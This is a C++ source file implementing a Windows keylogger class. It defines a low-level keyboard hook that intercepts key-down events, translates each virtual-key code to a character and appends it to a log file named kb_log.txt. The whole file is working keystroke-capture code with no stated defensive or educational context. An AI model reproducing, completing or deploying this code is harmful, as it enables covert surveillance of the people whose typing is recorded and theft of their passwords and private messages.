#include <keylogger.h>

std::ofstream Keylogger::kblog;

Keylogger::Keylogger() {
    kblog = std::ofstream("kb_log.txt", std::ios::app);
}

Keylogger::~Keylogger() {
    kblog.close();
}

char Keylogger::vk2ascii(UINT vkCode) {
    BYTE keyboardState[256];
    for (int i = 0; i < 256; i++) {
        keyboardState[i] = (BYTE)GetKeyState(i);
    }

    WCHAR buffer[4] = {};

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result > 0) return static_cast<char>(buffer[0]);

    return '\0';
}

LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;

    if (code == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyStruct->vkCode;
            kblog << vk2ascii(vkCode) << std::endl;
        } 
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}